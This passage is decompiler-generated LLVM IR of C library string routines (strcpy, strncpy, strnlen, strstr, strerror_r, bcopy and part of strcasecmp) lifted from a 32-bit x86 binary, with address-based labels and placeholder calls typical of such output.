define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f765 = load i32, i32* @esi, align 4
  store i32 %v0_804f765, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f76d = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f76d, i32* %edi.global-to-local, align 4
  %v4_804f771.pre = load i32, i32* @eax, align 4
  %v8_804f771.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804f771

dec_label_pc_804f771:                             ; preds = %dec_label_pc_804f771.dec_label_pc_804f771_crit_edge, %entry
  %v2_804f772 = phi i32 [ %v7_804f772, %dec_label_pc_804f771.dec_label_pc_804f771_crit_edge ], [ %v4_804f76d, %entry ]
  %v8_804f771 = phi i1 [ %v5_804f772, %dec_label_pc_804f771.dec_label_pc_804f771_crit_edge ], [ %v8_804f771.pre, %entry ]
  %v4_804f771 = phi i32 [ %v0_804f773, %dec_label_pc_804f771.dec_label_pc_804f771_crit_edge ], [ %v4_804f771.pre, %entry ]
  %v7_804f771 = phi i32 [ %v0_804f771.pre, %dec_label_pc_804f771.dec_label_pc_804f771_crit_edge ], [ %arg2, %entry ]
  %v1_804f771 = inttoptr i32 %v7_804f771 to i8*
  %v2_804f771 = load i8, i8* %v1_804f771, align 1
  %v3_804f771 = zext i8 %v2_804f771 to i32
  %v5_804f771 = and i32 %v4_804f771, -256
  %v6_804f771 = or i32 %v3_804f771, %v5_804f771
  store i32 %v6_804f771, i32* %eax.global-to-local, align 4
  %v9_804f771 = select i1 %v8_804f771, i32 -1, i32 1
  %v10_804f771 = add i32 %v7_804f771, %v9_804f771
  store i32 %v10_804f771, i32* %esi.global-to-local, align 4
  %v3_804f772 = inttoptr i32 %v2_804f772 to i8*
  store i8 %v2_804f771, i8* %v3_804f772, align 1
  %v4_804f772 = load i32, i32* %edi.global-to-local, align 4
  %v5_804f772 = load i1, i1* @df, align 1
  %v6_804f772 = select i1 %v5_804f772, i32 -1, i32 1
  %v7_804f772 = add i32 %v6_804f772, %v4_804f772
  store i32 %v7_804f772, i32* %edi.global-to-local, align 4
  %v0_804f773 = load i32, i32* %eax.global-to-local, align 4
  %v3_804f773 = trunc i32 %v0_804f773 to i8
  %v4_804f773 = icmp eq i8 %v3_804f773, 0
  %v1_804f775 = icmp eq i1 %v4_804f773, false
  br i1 %v1_804f775, label %dec_label_pc_804f771.dec_label_pc_804f771_crit_edge, label %dec_label_pc_804f777

dec_label_pc_804f771.dec_label_pc_804f771_crit_edge: ; preds = %dec_label_pc_804f771
  %v0_804f771.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f771

dec_label_pc_804f777:                             ; preds = %dec_label_pc_804f771
  store i32 %v4_804f76d, i32* %eax.global-to-local, align 4
  %v2_804f77b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f77b, i32* @edx, align 4
  %v2_804f77c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f77c, i32* @esi, align 4
  ret i32 %v4_804f76d

; uselistorder directives
  uselistorder i32 %v0_804f773, { 1, 0 }
  uselistorder i32 %v7_804f772, { 1, 0 }
  uselistorder i1 %v5_804f772, { 1, 0 }
  uselistorder i32 %v4_804f76d, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f795 = load i32, i32* @esi, align 4
  store i32 %v0_804f795, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f7a1 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f7a1, i32* %edi.global-to-local, align 4
  %v1_804f7a5 = add i32 %arg3, 1
  store i32 %v1_804f7a5, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f7a6

dec_label_pc_804f7a6:                             ; preds = %dec_label_pc_804f7a9, %entry
  %v3_804f7aa = phi i32 [ %v4_804f7a1, %entry ], [ %v8_804f7aa, %dec_label_pc_804f7a9 ]
  %v0_804f7a6 = phi i32 [ %v1_804f7a5, %entry ], [ %v0_804f7a6.pre, %dec_label_pc_804f7a9 ]
  %v1_804f7a6 = add i32 %v0_804f7a6, -1
  %v8_804f7a6 = icmp eq i32 %v1_804f7a6, 0
  store i32 %v1_804f7a6, i32* %ecx.global-to-local, align 4
  br i1 %v8_804f7a6, label %.loopexit, label %dec_label_pc_804f7a9

dec_label_pc_804f7a9:                             ; preds = %dec_label_pc_804f7a6
  %v0_804f7a9 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f7a9 = inttoptr i32 %v0_804f7a9 to i8*
  %v2_804f7a9 = load i8, i8* %v1_804f7a9, align 1
  %v10_804f7a9 = load i1, i1* @df, align 1
  %v11_804f7a9 = select i1 %v10_804f7a9, i32 -1, i32 1
  %v12_804f7a9 = add i32 %v11_804f7a9, %v0_804f7a9
  store i32 %v12_804f7a9, i32* %esi.global-to-local, align 4
  %v4_804f7aa = inttoptr i32 %v3_804f7aa to i8*
  store i8 %v2_804f7a9, i8* %v4_804f7aa, align 1
  %v5_804f7aa = load i32, i32* %edi.global-to-local, align 4
  %v6_804f7aa = load i1, i1* @df, align 1
  %v7_804f7aa = select i1 %v6_804f7aa, i32 -1, i32 1
  %v8_804f7aa = add i32 %v7_804f7aa, %v5_804f7aa
  store i32 %v8_804f7aa, i32* %edi.global-to-local, align 4
  %v6_804f7ab = icmp eq i8 %v2_804f7a9, 0
  %v1_804f7ad = icmp eq i1 %v6_804f7ab, false
  %v0_804f7a6.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_804f7ad, label %dec_label_pc_804f7a6, label %dec_label_pc_804f7af

dec_label_pc_804f7af:                             ; preds = %dec_label_pc_804f7a9
  %v1_804f7af = add i32 %v0_804f7a6.pre, -1
  store i32 %v1_804f7af, i32* %ecx.global-to-local, align 4
  %v2_804f7b0 = sext i8 %v2_804f7a9 to i32
  %v4_804f7b0 = inttoptr i32 %v8_804f7aa to i8*
  %v5_804f7b0 = call i8* @_memset(i8* %v4_804f7b0, i32 %v2_804f7b0, i32 %v1_804f7af)
  %v6_804f7b0 = ptrtoint i8* %v5_804f7b0 to i32
  store i32 %v6_804f7b0, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804f7a6, %dec_label_pc_804f7af
  %v2_804f7b6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f7b6, i32* @edx, align 4
  %v2_804f7b7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f7b7, i32* @esi, align 4
  ret i32 %v4_804f7a1

; uselistorder directives
  uselistorder i32 %v8_804f7aa, { 0, 2, 1 }
  uselistorder i8 %v2_804f7a9, { 0, 2, 1 }
  uselistorder i32 %v1_804f7a6, { 1, 0 }
  uselistorder i32 %v4_804f7a1, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %v4_804f7bc = ptrtoint i8* %tmp4 to i32
  %v8_804f7cf8 = icmp eq i32 %tmp, 0
  %v1_804f7d010 = icmp eq i1 %v8_804f7cf8, false
  br i1 %v1_804f7d010, label %dec_label_pc_804f7c9, label %dec_label_pc_804f7d2

dec_label_pc_804f7c9:                             ; preds = %entry, %dec_label_pc_804f7ce
  %v1_804f7cf12 = phi i32 [ %v1_804f7cf, %dec_label_pc_804f7ce ], [ %tmp, %entry ]
  %v0_804f7d211 = phi i32 [ %v1_804f7ce, %dec_label_pc_804f7ce ], [ %v4_804f7bc, %entry ]
  %v1_804f7c9 = inttoptr i32 %v0_804f7d211 to i8*
  %v2_804f7c9 = load i8, i8* %v1_804f7c9, align 1
  %v3_804f7c9 = icmp eq i8 %v2_804f7c9, 0
  br i1 %v3_804f7c9, label %dec_label_pc_804f7d2, label %dec_label_pc_804f7ce

dec_label_pc_804f7ce:                             ; preds = %dec_label_pc_804f7c9
  %v1_804f7ce = add i32 %v0_804f7d211, 1
  %v1_804f7cf = add i32 %v1_804f7cf12, -1
  %v8_804f7cf = icmp eq i32 %v1_804f7cf, 0
  %v1_804f7d0 = icmp eq i1 %v8_804f7cf, false
  br i1 %v1_804f7d0, label %dec_label_pc_804f7c9, label %dec_label_pc_804f7d2

dec_label_pc_804f7d2:                             ; preds = %dec_label_pc_804f7ce, %dec_label_pc_804f7c9, %entry
  %v0_804f7d2.lcssa = phi i32 [ %v4_804f7bc, %entry ], [ %v0_804f7d211, %dec_label_pc_804f7c9 ], [ %v1_804f7ce, %dec_label_pc_804f7ce ]
  %v2_804f7d2 = sub i32 %v0_804f7d2.lcssa, %v4_804f7bc
  ret i32 %v2_804f7d2

; uselistorder directives
  uselistorder i32 %v1_804f7cf, { 1, 0 }
  uselistorder i32 %v0_804f7d211, { 0, 2, 1 }
  uselistorder i32 %v4_804f7bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f7c9, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %v0_804f7db = load i32, i32* @ebx, align 4
  %v4_804f7df = ptrtoint i8* %arg2 to i32
  %v2_804f7e7 = load i8, i8* %arg2, align 1
  %v1_804f7ea = icmp eq i8 %v2_804f7e7, 0
  br i1 %v1_804f7ea, label %dec_label_pc_804f89e, label %dec_label_pc_804f7f5

dec_label_pc_804f7f5:                             ; preds = %entry
  %v1_804f7f5 = add i32 %arg1, -1
  br label %dec_label_pc_804f7f6

dec_label_pc_804f7f6:                             ; preds = %dec_label_pc_804f802, %dec_label_pc_804f7f5
  %v0_804f7f6 = phi i32 [ %v1_804f7f6, %dec_label_pc_804f802 ], [ %v1_804f7f5, %dec_label_pc_804f7f5 ]
  %v1_804f7f6 = add i32 %v0_804f7f6, 1
  %v1_804f7f7 = inttoptr i32 %v1_804f7f6 to i8*
  %v2_804f7f7 = load i8, i8* %v1_804f7f7, align 1
  %v1_804f7fa = icmp eq i8 %v2_804f7f7, 0
  br i1 %v1_804f7fa, label %dec_label_pc_804f89c, label %dec_label_pc_804f802

dec_label_pc_804f802:                             ; preds = %dec_label_pc_804f7f6
  %v14_804f802 = icmp eq i8 %v2_804f7f7, %v2_804f7e7
  %v1_804f805 = icmp eq i1 %v14_804f802, false
  br i1 %v1_804f805, label %dec_label_pc_804f7f6, label %dec_label_pc_804f807

dec_label_pc_804f807:                             ; preds = %dec_label_pc_804f802
  %v1_804f807 = add i32 %v4_804f7df, 1
  %v2_804f80e = inttoptr i32 %v1_804f807 to i8*
  %v3_804f80e = load i8, i8* %v2_804f80e, align 1
  %v1_804f812 = icmp eq i8 %v3_804f80e, 0
  br i1 %v1_804f812, label %dec_label_pc_804f89e, label %dec_label_pc_804f81a

dec_label_pc_804f81a:                             ; preds = %dec_label_pc_804f807
  %v1_804f81a = add i32 %v0_804f7f6, 2
  %v1_804f864 = add i32 %v4_804f7df, 2
  %v2_804f864 = inttoptr i32 %v1_804f864 to i8*
  br label %dec_label_pc_804f850

dec_label_pc_804f825:                             ; preds = %dec_label_pc_804f894
  %v2_804f825 = inttoptr i32 %v0_804f856 to i8*
  %v3_804f825 = load i8, i8* %v2_804f825, align 1
  br label %dec_label_pc_804f843.preheader

dec_label_pc_804f843.preheader:                   ; preds = %dec_label_pc_804f825, %dec_label_pc_804f850
  %v0_804f82e.ph.in = phi i8 [ %v4_804f81a.sink.in, %dec_label_pc_804f850 ], [ %v3_804f825, %dec_label_pc_804f825 ]
  %v14_804f84345 = icmp eq i8 %v0_804f82e.ph.in, %v2_804f7e7
  %v1_804f84647 = icmp eq i1 %v14_804f84345, false
  br i1 %v1_804f84647, label %dec_label_pc_804f82e, label %dec_label_pc_804f848

dec_label_pc_804f82e:                             ; preds = %dec_label_pc_804f843.preheader, %dec_label_pc_804f83f
  %v0_804f82e49.in = phi i8 [ %v2_804f840, %dec_label_pc_804f83f ], [ %v0_804f82e.ph.in, %dec_label_pc_804f843.preheader ]
  %v0_804f83248 = phi i32 [ %v1_804f83f, %dec_label_pc_804f83f ], [ %v0_804f856, %dec_label_pc_804f843.preheader ]
  %v1_804f82e = icmp eq i8 %v0_804f82e49.in, 0
  br i1 %v1_804f82e, label %dec_label_pc_804f89c, label %dec_label_pc_804f832

dec_label_pc_804f832:                             ; preds = %dec_label_pc_804f82e
  %v1_804f832 = add i32 %v0_804f83248, 1
  %v1_804f833 = inttoptr i32 %v1_804f832 to i8*
  %v2_804f833 = load i8, i8* %v1_804f833, align 1
  %v14_804f836 = icmp eq i8 %v2_804f833, %v2_804f7e7
  br i1 %v14_804f836, label %dec_label_pc_804f848, label %dec_label_pc_804f83b

dec_label_pc_804f83b:                             ; preds = %dec_label_pc_804f832
  %v1_804f83b = icmp eq i8 %v2_804f833, 0
  br i1 %v1_804f83b, label %dec_label_pc_804f89c, label %dec_label_pc_804f83f

dec_label_pc_804f83f:                             ; preds = %dec_label_pc_804f83b
  %v1_804f83f = add i32 %v0_804f83248, 2
  %v1_804f840 = inttoptr i32 %v1_804f83f to i8*
  %v2_804f840 = load i8, i8* %v1_804f840, align 1
  %v14_804f843 = icmp eq i8 %v2_804f840, %v2_804f7e7
  %v1_804f846 = icmp eq i1 %v14_804f843, false
  br i1 %v1_804f846, label %dec_label_pc_804f82e, label %dec_label_pc_804f848

dec_label_pc_804f848:                             ; preds = %dec_label_pc_804f83f, %dec_label_pc_804f832, %dec_label_pc_804f843.preheader
  %v0_804f848 = phi i32 [ %v0_804f856, %dec_label_pc_804f843.preheader ], [ %v1_804f832, %dec_label_pc_804f832 ], [ %v1_804f83f, %dec_label_pc_804f83f ]
  %v1_804f848 = add i32 %v0_804f848, 1
  br label %dec_label_pc_804f850

dec_label_pc_804f850:                             ; preds = %dec_label_pc_804f81a, %dec_label_pc_804f848
  %v0_804f856 = phi i32 [ %v1_804f81a, %dec_label_pc_804f81a ], [ %v1_804f848, %dec_label_pc_804f848 ]
  %v4_804f81a.sink.in.in.in = phi i32 [ %v1_804f81a, %dec_label_pc_804f81a ], [ %v1_804f848, %dec_label_pc_804f848 ]
  %v4_804f81a.sink.in.in = inttoptr i32 %v4_804f81a.sink.in.in.in to i8*
  %v4_804f81a.sink.in = load i8, i8* %v4_804f81a.sink.in.in, align 1
  %storemerge4 = icmp eq i8 %v4_804f81a.sink.in, %v3_804f80e
  %v1_804f850 = icmp eq i1 %storemerge4, false
  br i1 %v1_804f850, label %dec_label_pc_804f843.preheader, label %dec_label_pc_804f852

dec_label_pc_804f852:                             ; preds = %dec_label_pc_804f850
  %v1_804f856 = add i32 %v0_804f856, 1
  %v1_804f85d = add i32 %v0_804f856, -1
  %v2_804f860 = inttoptr i32 %v1_804f856 to i8*
  %v3_804f860 = load i8, i8* %v2_804f860, align 1
  %v4_804f860 = zext i8 %v3_804f860 to i32
  %v3_804f864 = load i8, i8* %v2_804f864, align 1
  %v4_804f864 = zext i8 %v3_804f864 to i32
  %v12_804f869 = icmp eq i8 %v3_804f860, %v3_804f864
  %v1_804f86b = icmp eq i1 %v12_804f869, false
  br i1 %v1_804f86b, label %dec_label_pc_804f894, label %dec_label_pc_804f86d

dec_label_pc_804f86d:                             ; preds = %dec_label_pc_804f852, %dec_label_pc_804f881
  %v0_804f884 = phi i32 [ %v1_804f884, %dec_label_pc_804f881 ], [ %v1_804f864, %dec_label_pc_804f852 ]
  %v0_804f881 = phi i32 [ %v1_804f881, %dec_label_pc_804f881 ], [ %v1_804f856, %dec_label_pc_804f852 ]
  %v0_804f86d = phi i32 [ %v3_804f887, %dec_label_pc_804f881 ], [ %v4_804f860, %dec_label_pc_804f852 ]
  %v1_804f86d = icmp eq i32 %v0_804f86d, 0
  br i1 %v1_804f86d, label %dec_label_pc_804f89e, label %dec_label_pc_804f871

dec_label_pc_804f871:                             ; preds = %dec_label_pc_804f86d
  %v1_804f871 = add i32 %v0_804f881, 1
  %v2_804f871 = inttoptr i32 %v1_804f871 to i8*
  %v3_804f871 = load i8, i8* %v2_804f871, align 1
  %v1_804f875 = add i32 %v0_804f884, 1
  %v2_804f875 = inttoptr i32 %v1_804f875 to i8*
  %v3_804f875 = load i8, i8* %v2_804f875, align 1
  %v4_804f875 = zext i8 %v3_804f875 to i32
  %v12_804f879 = icmp eq i8 %v3_804f871, %v3_804f875
  %v1_804f87b = icmp eq i1 %v12_804f879, false
  br i1 %v1_804f87b, label %dec_label_pc_804f894, label %dec_label_pc_804f87d

dec_label_pc_804f87d:                             ; preds = %dec_label_pc_804f871
  %v1_804f87d = icmp eq i8 %v3_804f875, 0
  br i1 %v1_804f87d, label %dec_label_pc_804f89e, label %dec_label_pc_804f881

dec_label_pc_804f881:                             ; preds = %dec_label_pc_804f87d
  %v1_804f881 = add i32 %v0_804f881, 2
  %v1_804f884 = add i32 %v0_804f884, 2
  %v1_804f887 = inttoptr i32 %v1_804f884 to i8*
  %v2_804f887 = load i8, i8* %v1_804f887, align 1
  %v3_804f887 = zext i8 %v2_804f887 to i32
  %v1_804f88b = inttoptr i32 %v1_804f881 to i8*
  %v2_804f88b = load i8, i8* %v1_804f88b, align 1
  %v12_804f88e = icmp eq i8 %v2_804f88b, %v2_804f887
  br i1 %v12_804f88e, label %dec_label_pc_804f86d, label %dec_label_pc_804f892

dec_label_pc_804f892:                             ; preds = %dec_label_pc_804f881
  br label %dec_label_pc_804f894

dec_label_pc_804f894:                             ; preds = %dec_label_pc_804f871, %dec_label_pc_804f852, %dec_label_pc_804f892
  %v0_804f894 = phi i32 [ %v4_804f864, %dec_label_pc_804f852 ], [ %v3_804f887, %dec_label_pc_804f892 ], [ %v4_804f875, %dec_label_pc_804f871 ]
  %v1_804f894 = icmp eq i32 %v0_804f894, 0
  %v1_804f896 = icmp eq i1 %v1_804f894, false
  br i1 %v1_804f896, label %dec_label_pc_804f825, label %dec_label_pc_804f89e

dec_label_pc_804f89c:                             ; preds = %dec_label_pc_804f7f6, %dec_label_pc_804f83b, %dec_label_pc_804f82e
  br label %dec_label_pc_804f89e

dec_label_pc_804f89e:                             ; preds = %dec_label_pc_804f894, %dec_label_pc_804f86d, %dec_label_pc_804f87d, %entry, %dec_label_pc_804f807, %dec_label_pc_804f89c
  %storemerge2 = phi i32 [ 0, %dec_label_pc_804f89c ], [ %v1_804f7f6, %dec_label_pc_804f807 ], [ %arg1, %entry ], [ %v1_804f85d, %dec_label_pc_804f87d ], [ %v1_804f85d, %dec_label_pc_804f86d ], [ %v1_804f85d, %dec_label_pc_804f894 ]
  store i32 %v0_804f7db, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_804f884, { 1, 0 }
  uselistorder i32 %v1_804f881, { 1, 0 }
  uselistorder i8 %v3_804f875, { 1, 0, 2 }
  uselistorder i8 %v4_804f81a.sink.in, { 1, 0 }
  uselistorder i32 %v0_804f856, { 4, 3, 2, 1, 0 }
  uselistorder i8 %v2_804f840, { 1, 0 }
  uselistorder i32 %v1_804f83f, { 0, 2, 1 }
  uselistorder i8 %v2_804f833, { 1, 0 }
  uselistorder i32 %v0_804f83248, { 1, 0 }
  uselistorder i32 %v1_804f7f6, { 0, 2, 1 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804f89e, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_804f89c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f894, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f86d, { 1, 0 }
  uselistorder label %dec_label_pc_804f850, { 1, 0 }
  uselistorder label %dec_label_pc_804f82e, { 1, 0 }
  uselistorder label %dec_label_pc_804f843.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_804f8b9 = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_804f8c1 = load i32, i32* @ebx, align 4
  ret i32 %v0_804f8c1
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_804f8da = icmp ugt i32 %arg1, 124
  br i1 %v6_804f8da, label %dec_label_pc_804f8f7, label %dec_label_pc_804f8dc

dec_label_pc_804f8dc:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_8057400.175 to i32), i32* @esi, align 4
  %v1_804f8ec4 = icmp eq i32 %arg1, 0
  %v1_804f8ee11 = icmp eq i1 %v1_804f8ec4, false
  br i1 %v1_804f8ee11, label %dec_label_pc_804f8e5, label %dec_label_pc_804f8f0

dec_label_pc_804f8e5:                             ; preds = %dec_label_pc_804f8dc, %dec_label_pc_804f8e5
  %v0_804f8e8 = phi i32 [ %v3_804f8e8, %dec_label_pc_804f8e5 ], [ %arg1, %dec_label_pc_804f8dc ]
  %v0_804f8eb = phi i32 [ %v1_804f8eb, %dec_label_pc_804f8e5 ], [ ptrtoint ([8 x i8]* @global_var_8057400.175 to i32), %dec_label_pc_804f8dc ]
  %v1_804f8e5 = inttoptr i32 %v0_804f8eb to i8*
  %v2_804f8e5 = load i8, i8* %v1_804f8e5, align 1
  %v7_804f8e5 = icmp eq i8 %v2_804f8e5, 0
  %v2_804f8e8 = zext i1 %v7_804f8e5 to i32
  %v3_804f8e8 = add i32 %v2_804f8e8, %v0_804f8e8
  %v16_804f8e8 = icmp eq i32 %v3_804f8e8, 0
  %v1_804f8eb = add i32 %v0_804f8eb, 1
  store i32 %v1_804f8eb, i32* @esi, align 4
  %v1_804f8ee = icmp eq i1 %v16_804f8e8, false
  br i1 %v1_804f8ee, label %dec_label_pc_804f8e5, label %dec_label_pc_804f8f0

dec_label_pc_804f8f0:                             ; preds = %dec_label_pc_804f8e5, %dec_label_pc_804f8dc
  %v0_804f8f2 = phi i32 [ ptrtoint ([8 x i8]* @global_var_8057400.175 to i32), %dec_label_pc_804f8dc ], [ %v1_804f8eb, %dec_label_pc_804f8e5 ]
  store i32 0, i32* @ebp, align 4
  %v1_804f8f2 = inttoptr i32 %v0_804f8f2 to i8*
  %v2_804f8f2 = load i8, i8* %v1_804f8f2, align 1
  %v3_804f8f2 = icmp eq i8 %v2_804f8f2, 0
  %v1_804f8f5 = icmp eq i1 %v3_804f8f2, false
  br i1 %v1_804f8f5, label %dec_label_pc_804f8f0.dec_label_pc_804f926_crit_edge, label %dec_label_pc_804f8f7

dec_label_pc_804f8f0.dec_label_pc_804f926_crit_edge: ; preds = %dec_label_pc_804f8f0
  br label %dec_label_pc_804f926

dec_label_pc_804f8f7:                             ; preds = %dec_label_pc_804f8f0, %entry
  %v1_804f8fa = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  store i32 22, i32* @ebp, align 4
  %v6_804f90b = bitcast i32* %stack_var_-17 to i8*
  %v7_804f90b = call i32 @_uintmaxtostr(i8* %v6_804f90b, i32 %arg1, i32 %v1_804f8fa, i32 -10, i32 0)
  %v1_804f91a = add i32 %v7_804f90b, -14
  store i32 %v1_804f91a, i32* @esi, align 4
  %v5_804f91d = inttoptr i32 %v1_804f91a to i8*
  store i8* %v5_804f91d, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_804f91a to i16*
  %v6_804f91e = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_80573d6.176 to i32), i32 14)
  %v1_804f930.pre = load i32, i32* @edi, align 4
  %v0_804f936.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f926

dec_label_pc_804f926:                             ; preds = %dec_label_pc_804f8f0.dec_label_pc_804f926_crit_edge, %dec_label_pc_804f8f7
  %v0_804f936 = phi i32 [ %v0_804f8f2, %dec_label_pc_804f8f0.dec_label_pc_804f926_crit_edge ], [ %v0_804f936.pre, %dec_label_pc_804f8f7 ]
  %v1_804f930 = phi i32 [ %arg3, %dec_label_pc_804f8f0.dec_label_pc_804f926_crit_edge ], [ %v1_804f930.pre, %dec_label_pc_804f8f7 ]
  %v4_804f926 = icmp eq i32 %arg2, 0
  %v3_804f930 = select i1 %v4_804f926, i32 0, i32 %v1_804f930
  store i32 %v3_804f930, i32* @edi, align 4
  %v5_804f936 = inttoptr i32 %v0_804f936 to i8*
  store i8* %v5_804f936, i8** %stack_var_-108, align 4
  %v3_804f937 = call i32 @strlen(i8* %v5_804f936)
  %v1_804f93f = add i32 %v3_804f937, 1
  store i32 %v1_804f93f, i32* %ebx.global-to-local, align 4
  %v1_804f942 = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v1_804f93f, %v1_804f942
  br i1 %tmp, label %dec_label_pc_804f946, label %dec_label_pc_804f94d

dec_label_pc_804f946:                             ; preds = %dec_label_pc_804f926
  store i32 %v1_804f942, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_804f94d

dec_label_pc_804f94d:                             ; preds = %dec_label_pc_804f926, %dec_label_pc_804f946
  %v0_804f952 = phi i32 [ %v1_804f93f, %dec_label_pc_804f926 ], [ %v1_804f942, %dec_label_pc_804f946 ]
  %v1_804f94d = icmp eq i32 %v0_804f952, 0
  br i1 %v1_804f94d, label %dec_label_pc_804f969, label %dec_label_pc_804f951

dec_label_pc_804f951:                             ; preds = %dec_label_pc_804f94d
  %v0_804f953 = load i32, i32* @esi, align 4
  %v8_804f954 = inttoptr i32 %arg2 to i8*
  store i8* %v8_804f954, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_804f958 = call i32 @memcpy(i16* %tmp45, i32 %v0_804f953, i32 %v0_804f952)
  %v1_804f964 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f964 = add i32 %arg2, -1
  %v3_804f964 = add i32 %v2_804f964, %v1_804f964
  %v4_804f964 = inttoptr i32 %v3_804f964 to i8*
  store i8 0, i8* %v4_804f964, align 1
  br label %dec_label_pc_804f969

dec_label_pc_804f969:                             ; preds = %dec_label_pc_804f94d, %dec_label_pc_804f951
  %v0_804f969 = load i32, i32* @ebp, align 4
  %v1_804f969 = icmp eq i32 %v0_804f969, 0
  br i1 %v1_804f969, label %dec_label_pc_804f974, label %dec_label_pc_804f96d

dec_label_pc_804f96d:                             ; preds = %dec_label_pc_804f969
  %v0_804f96d = load i8*, i8** %stack_var_-108, align 4
  %v1_804f96d = ptrtoint i8* %v0_804f96d to i32
  %v2_804f96d = call i32 @__errno_location(i32 %v1_804f96d)
  %v0_804f972 = load i32, i32* @ebp, align 4
  %v2_804f972 = inttoptr i32 %v2_804f96d to i32*
  store i32 %v0_804f972, i32* %v2_804f972, align 4
  %v0_804f977.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f974

dec_label_pc_804f974:                             ; preds = %dec_label_pc_804f969, %dec_label_pc_804f96d
  %v0_804f977 = phi i32 [ 0, %dec_label_pc_804f969 ], [ %v0_804f977.pre, %dec_label_pc_804f96d ]
  ret i32 %v0_804f977

; uselistorder directives
  uselistorder i32 %v1_804f942, { 1, 2, 0 }
  uselistorder i32 %v1_804f93f, { 1, 0, 2 }
  uselistorder i32 %v1_804f8eb, { 0, 2, 1 }
  uselistorder i32 %v3_804f8e8, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_8057400.175 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_804f974, { 1, 0 }
  uselistorder label %dec_label_pc_804f969, { 1, 0 }
  uselistorder label %dec_label_pc_804f94d, { 1, 0 }
  uselistorder label %dec_label_pc_804f926, { 1, 0 }
  uselistorder label %dec_label_pc_804f8e5, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_804f990 = inttoptr i32 %arg2 to i8*
  %v3_804f990 = call i32 @memmove(i8* %v2_804f990, i32 %arg1)
  ret i32 %v3_804f990
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804f999 = load i32, i32* bitcast (i32** @global_var_805a6a0.178 to i32*), align 32
  %v4_804f9a2 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804f9aa

dec_label_pc_804f9aa:                             ; preds = %dec_label_pc_804f9c7, %entry
  %storemerge = phi i32 [ %v4_804f9a2, %entry ], [ %v1_804f9c8, %dec_label_pc_804f9c7 ]
  %v0_804f9c8 = phi i32 [ %v4_804f9a2, %entry ], [ %v1_804f9c8, %dec_label_pc_804f9c7 ]
  %v0_804f9cd6 = phi i32 [ 0, %entry ], [ %v0_804f9cd7, %dec_label_pc_804f9c7 ]
